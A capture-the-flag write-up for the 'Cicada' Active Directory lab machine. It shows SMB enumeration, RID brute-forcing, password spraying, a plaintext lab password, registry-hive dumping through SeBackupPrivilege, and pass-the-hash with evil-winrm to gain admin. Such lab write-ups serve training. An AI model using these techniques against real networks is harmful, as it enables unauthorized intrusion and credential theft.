# Cicada (easy)

## 1. Scanning

<pre><code><strong>❯ nmap -sV -sC -Pn 10.10.11.35
</strong>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 02:23 +08
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.032s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-08 01:07:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&#x3C;unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&#x3C;unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&#x3C;unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&#x3C;unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-08T01:07:42
|_  start_date: N/A
|_clock-skew: 6h43m18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.42 seconds
</code></pre>

From the scanning result, we can see it is a Windows AD environment with usual services like Kerberos, LDAP and the Microsoft Remote Procedure Call (MSRPC).&#x20;

There is also the SMB protocol present in ports 139 and 445.&#x20;

* **Port 139**: SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network.
* **Port 445:** Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.

***

## 2. Enumerating

Now we will try to enumerate the SMB shares

<figure><img src="../../../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

Other than the default SMB shares and Logon server shares which contains files and scripts used for logging on to a computer or domain, we are interested in the `HR` and `DEV` shares

For DEV share, we are denied listing

<figure><img src="../../../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

For HR share, we can list the directory and see there is a file

<figure><img src="../../../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

Download the file

<pre><code><strong>smb: \> get "Notice from HR.txt"
</strong></code></pre>

Contents of the file:

<figure><img src="../../../../.gitbook/assets/image (597).png" alt=""><figcaption></figcaption></figure>

the message hints that the password belongs to some user but we don't know who that is. After looking around there is an option using `netexec` where we can bruteforce the list of users. The command can be found [here](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid).

{% hint style="info" %}
Note: The `user` argument needs to be 'guest' and the `password`  argument needs to be empty.
{% endhint %}

<pre><code><strong>❯ nxc smb 10.10.11.35 -u guest -p '' --rid-brute 
</strong>SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
</code></pre>

Looking at the RID (Relative Identifier) that starts with 1000 because that is the RID for normal users, We can list there are a few users of interest:

1. john.smoulder
2. sarah.dantelia
3. michael.wrightson
4. david.orelious
5. emily.oscars

According to [here](https://www.netexec.wiki/smb-protocol/password-spraying), `netexec` also has an option for password spraying. Since we received the password from the message in the SMB share, we can put the users in a list and use the command:

<pre><code><strong>nxc smb &#x3C;ip> -u /path/to/users.txt -p &#x3C;password>
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (598).png" alt=""><figcaption></figcaption></figure>

We got a hit on user `michael.wrightson` . Nice!

Now, we can list available shares on Michael's AD account

<pre><code><strong>nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>

We don't have permission to read the `DEV` share

<figure><img src="../../../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

So, this is the part for me where it gets funny. Although, the password for Michael's account was retrieved. I could not do anything with it except logging into his account. Asking around in the discussion group they said the key was to 'enumerate'. So, I enumerated the users again but this time with Michael's credentials.

<pre><code><strong>nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

Cool, `david.orelious` left his password in the description. That's good (for us). Now, we enumerate the shares permission for David's AD account

<figure><img src="../../../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

Nice. We have permission to read the `DEV` share. I downloaded the Powershell script on my machine using `get`

<figure><img src="../../../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

Reading the Powershell script reveals `emily.oscars` password.

<figure><img src="../../../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

Now, we enumerate Emily's shares permissions

<figure><img src="../../../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

Emily has Read and Write access to the `C$` share which is unusual because it usually requires administrator-level privileges because it is an administrative share for the C drive. This also means Emily might have elevated access.

***

## 3. Gaining Access

<figure><img src="../../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

Alright. We have access to Emily's system. Now I tried using regex to search for `user.txt` but it didn't work. So, i manually searched for it and traversed through the `Users` directory and found it in

<pre><code><strong>C$\Users\emily.oscars.CICADA\Desktop\
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

User flag secured!

***

## 4. Privilege Escalation

We will use `Evil-winrm` to get a Powershell session on the compromised host.

<pre><code><strong>evil-winrm -i &#x3C;ip> -u &#x3C;user> -p &#x3C;password>
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

Remember. After gaining access, always remember to **check your priveleges.**

<pre><code><strong>❯ *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all
</strong>
USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</code></pre>

From the Privileges that are shown, `SeBackupPrivilege` is enabled. A bit of research will reveal that this specific Privilege will allow the user to read sensitive system files like the Windows registry and the NTDS.dit (which contains the NTLM hashes)

First, we create a directory to store the registry hives

<figure><img src="../../../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

Second, we backup the SAM and SYSTEM hives

<figure><img src="../../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

Download them onto our machine

<figure><img src="../../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

Dump the hashes using `impacket`

<figure><img src="../../../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

Now, the fun part. Just pass-the-hash. Get it? okay maybe not that funny for seasoned veterans. Anyways, looking back in the `Group Information` . The user we are currently logged in is present in the NTLM Authentication which means we can abuse a well known attack vector in NTLMs which is Pass-The-Hash (Pth)

Basically, we don't need to crack the hash. Just pass it as it is as an argument and it should be good. There a lot of ways to do this but I will use `evil-winrm` with the `-h` flag

{% embed url="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/" %}

<pre><code><strong>evil-winrm -i &#x3C;ip> -u &#x3C;user> -H &#x3C;hash>
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (614).png" alt=""><figcaption></figcaption></figure>

Boom! we are Admin

Now locate the flag in `/Desktop` and Download it

<figure><img src="../../../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>

Root flag secured!
